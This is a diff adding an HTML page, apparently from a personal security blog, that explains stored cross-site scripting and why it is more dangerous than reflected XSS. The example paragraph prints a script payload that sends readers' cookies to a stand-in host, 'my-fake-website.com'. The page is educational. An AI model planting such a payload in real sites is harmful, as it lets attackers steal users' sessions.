@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Stored Cross Site Scripting</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+        <link href="../css/styles.css" rel="stylesheet" />
+        <link href="../js/scripts.js">
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+       </head>
+    <body>
+        <nav class="navbar navbar-expand-lg navbar-light bg-light">
+            <a class="navbar-brand" href="index.html">ICON_LOGO</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+              <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNavDropdown">
+              <ul class="navbar-nav">
+                <li class="nav-item">
+                  <a class="nav-link" href="../blog.html">BLOG</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">ABOUT ME</a>
+                  </li>
+              </ul>
+            </div>
+          </nav>
+        <header class="container">
+            <h1>Stored Cross Site Scripting</h1>
+        </header>
+        <div class="container">
+            <h3>Description:</h3>
+            <p>This Vulnerability is more serious than Reflected XSS.In this XSS Attack, an attacker submits a malicious XSS payload to the web application.The applcation without sanitizing or filtering the inputs strores it directly in its database. Now when any other user requests for the webpage,the malicious payload is rendered as a part of the response and XSS gets triggered. <br>This is also called second-order XSS,because first a malicious payload has to be crafted before being sent to the server and second it must be displayed to the other users for it to trigger.</p>
+            <p><strong>EXAMPLE :</strong> Suppose you are on a group chat on a website, that is vulnerable to Stored XSS. If I enter the message, <span style="color:cornflowerblue;">&lt;script&gt;document.location="http://www.my-fake-website.com/"+document.cookie;&lt;/script&gt;</span> and the server without performing any sanitization check on the input, stores it in the server and then displays it to others in the group, then I shall have access to each and everyone's cookie who saw my message. <br> Here my chances of actually getting someone's cookie is much more than that it was in the Reflected XSS, because here you don't have to convince someone to click on a link.</p>
+            <p class="tex-muted">Further, if the user isn't logged in, then the payload will not return anything,in case of Reflected XSS.But in Stored XSS, users will already have been logged in resulting in a hit. This is what makes it much more dangerous than Reflected XSS.</p>
+        </div>    
+    </body>
+</html>
